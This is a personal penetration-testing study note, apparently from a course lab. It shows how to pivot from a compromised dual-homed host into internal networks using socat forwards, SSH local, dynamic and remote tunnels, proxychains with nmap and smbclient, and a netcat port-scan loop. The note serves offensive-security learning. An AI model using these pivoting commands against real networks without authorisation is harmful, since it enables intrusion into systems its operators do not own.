### Summary All Commands
```bash
# simple port forward
socat -ddd TCP-LISTEN:$OPEN_NEW_PORT,fork TCP:$INTERNAL_IP:$INTERNAL_IP_PORT
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

# SSH local port forward
ssh -N -L 0.0.0.0:4455:$MOST_INTERNAL_IP:$MOST_INTERNAL_PORT $middle_user@$middle_system
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 # -N is to not open a shell instead just start a process

# SSH dynamic - proxychains
ssh -N -D 0.0.0.0:$OPEN_NEW_PORT $username@$MIDDLE_IP
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

# SSH remote port forward
ssh -N -R 127.0.0.1:5555:10.4.50.215:5432 hutgrabber@coffeetom -v

# SSH remote dynamic forwarding

```
# Port Forwarding & SSH Tunneling

## 1. Simple (Basic) Port Forwarding
Components:
- There is a dual homed system in the middle of the internal and the external network.
- Compromise the dual homed system & get shell on it.
- Open a port on the dual homed system such that all traffic coming inn on that port, will be forwarded to `port 445` (in this case) of the internal machine.
- Issue commands from Kali, sending traffic to the dual homed machine on the newly opened port & it will transfer everything to `port 445` (in this case) of the internal machine.
#### Procedure:
1. Creating a forward on the Dual Homed Machine with SOCAT:
```bash
# start a socat process on the dual_homed machine
# SOCAT WORKING
# socat "LISTEN" and then "FORWARD"
# socat TCP-LISTEN:$PORT,fork -- opens a port on the DH machine.
# fork -- creates a new process.
# TCP:$INTERNAL_TARGET_TP:$PORT -- this port should already be open.
# Ports 0-1024 require privs, do not use.
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

![[./images/Pasted image 20240111165811.png]]

2. Interacting with a port on one of the internal machines (PostgreSQL):
```bash
# now just interact with the internal IP just like normal.
psql -h $DH_IP -p $INTERNAL_PORT -U $USR
# $DH_IP -- send all traffic to the dual homed machine.
# DH Machine will forward it to the internal machine (via socat),
```

---
## 2. SSH Tunneling
### SSH Local Port Forwarding
Components:
- There is a dual homed machine, a machine in the interal network, as well as a third machine inside that network.
- In this situation there are two dual homed machines (one facing the external network, and one facing the confluence server - in this case.)
- This level of complexity is just for demonstration purposes.
- In this case you are going to SSH into `PGDATABASE01` and scan the entire network to see what else's inn there. Do this with a simple `for` loop:

```bash
for i in $(seq 1 254); do
	nc -zv -w 1 $IP_INTERNAL $PORT_INTERNAL;
done
```
- You might find something inside, and to take control of it, exit the `ssh` to `PGDATABASE01` and from the `confluence` run the ssh command that opens a new port `4455` (in this case) and then binds it to the machine in the internal network behind `PGDATABASE01` with the port that is open there. (It's `port 445` in this case.)

```bash
# on confluence01
ssh -N -L 0.0.0.0:4455:$MOST_INTERNAL_IP:$MOST_INTERNAL_PORT $middle_user@$middle_system
# the three networks in this case from left to right are
# > 192.168.50.63
# > 10.4.50.215
# > 172.16.50.217
# above command can be re-written as:
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 # -N is to not open a shell instead just start a process
```

![[Pasted image 20240118151737.png]]

---

### SSH Dynamic Port Forwarding (Proxychains)
Components:
- Same setup as above, however, we don't always know what systems are online & what port they are listening on. (Practically speaking)
- We want to be able to scan any network through `nmap` from our Kali Machine.
- From `confluence01` we will simply open a new port (`port 9999` in this case) & bind it to `pgdatabase01`. This will send any command from our system, directly to `pgdatabase01`,meaning if we ping `hr_shares` from our Kali machine, we can do so by directly using the `hr_shares` IP address since we can think of it as running commands directly from `pgdatabase01`.
- We just need to edit the `/etc/proxychains4.conf` file in our kali and setup a `socks5 proxy`. To do this, enter the IP of `confluence01` and the port we just opened. Meaning, this line `socks5 $IP_Confluence01 $PORT`. In this case, we will add the following line - `socks5 192.168.50.63 9999`.

```bash
# open a new port on confluence and foward all packets to pgdatabase:
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

# Running proxychains:
proxychains4 [any command]
proxychains4 smbclient -L //172.16.50.217/ -U 'username' -P='Passw0rd!' # the password takes the `=` symbol for some reason.
proxychains4 nmap -v -sT 172.16.50.217 -p 4800-4900 -T5 -Pn -n # -n to make sure no DNS errors occur.

# if running proxychains from inside the docker container:
qemu-x86_64-static /usr/bin/proxychains4 qemu-x86_64-static ./ELF_Binary_x86_Compiled
```

![[Pasted image 20240118153017.png]]

---

### SSH Remote Port Forwarding
First of all make sure that in the `/etc/ssh/sshd_config` file, you had added the line `PasswordAuthentication yes`. This will allow any machine to connect back to Kali with the user creds.
Components:
- In this case there is a firewall that only allows inbound packets on `port 8090` because of the web server running on `confluence01`. 
- So an outboud connection has to be made (bind shell of sorts) from `confluence01` to `kali` attack machine. This can be achieved by running the SSH command on `confluence01` that will open a new port on the loopback address of the `Kali` machine & bind it to an open port (`port 5432` in this case) on the internal machine.
- Then from the attak machine, the internal victim can be interacted with, by specifying the loopback address as the target IP address in all commands.

```bash
# on the confluence01 server
ssh -N -R 127.0.0.1:$OPEN_NEW_PORT:$INTERNAL_IP:$PORT $kali_user@$kali_IP -v
ssh -N -R 127.0.0.1:5555:10.4.50.215:5432 hutgrabber@coffeetom -v
```

![[Pasted image 20240118164544.png]]

---

### SSH Remote Dynamic Port Forwarding
